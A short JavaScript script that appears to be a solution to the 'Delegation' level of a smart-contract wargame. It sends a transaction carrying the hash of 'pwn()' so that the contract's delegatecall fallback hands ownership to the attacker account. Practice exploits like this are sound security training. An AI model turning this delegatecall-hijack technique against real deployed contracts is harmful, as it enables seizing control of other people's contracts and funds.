const {
    DELEGATION_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');
const web3 = require('web3');

async function main(levelName = 'Delegation') {
    logStartingLevel(levelName);

    if (!DELEGATION_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, DELEGATION_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Delegation");
    const contract = factory.attach(DELEGATION_INSTANCE_ADDRESS);
    const data = web3.utils.sha3("pwn()");

    const tx = await attacker.sendTransaction({
        to: contract.address,
        data,
        gasLimit: 100000,
    });
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
